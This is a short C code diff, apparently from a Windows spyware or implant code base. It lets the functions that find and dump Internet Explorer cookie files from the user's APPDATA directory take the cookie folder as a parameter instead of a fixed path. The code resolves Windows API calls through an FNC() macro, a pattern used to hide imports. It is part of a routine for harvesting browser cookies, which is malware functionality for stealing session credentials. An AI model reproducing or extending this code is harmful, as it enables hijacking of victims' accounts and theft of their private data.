@@ -64,25 +64,25 @@ void ParseIECookieFile(WCHAR *file)
 	SAFE_FREE(session_memory);
 }
 
-WCHAR *GetIEProfilePath()
+WCHAR *GetIEProfilePath(WCHAR *cookie_path)
 {
 	static WCHAR FullPath[MAX_PATH];
 	WCHAR appPath[MAX_PATH];
 
 	memset(appPath, 0, sizeof(appPath));
 	FNC(GetEnvironmentVariableW)(L"APPDATA", appPath, MAX_PATH);
-	_snwprintf_s(FullPath, MAX_PATH, L"%s\\Microsoft\\Windows\\Cookies\\Low", appPath);  
+	_snwprintf_s(FullPath, MAX_PATH, L"%s\\%s", appPath, cookie_path);  
 	return FullPath;
 }
 
-int DumpIECookies()
+int DumpIECookies(WCHAR *cookie_path)
 {
 	WCHAR *ie_dir;
 	WIN32_FIND_DATAW find_data;
 	WCHAR cookie_search[MAX_PATH];
 	HANDLE hFind;
 
-	ie_dir = GetIEProfilePath();
+	ie_dir = GetIEProfilePath(cookie_path);
 	_snwprintf_s(cookie_search, MAX_PATH, L"%s\\*", ie_dir);  
 
 	hFind = FNC(FindFirstFileW)(cookie_search, &find_data);
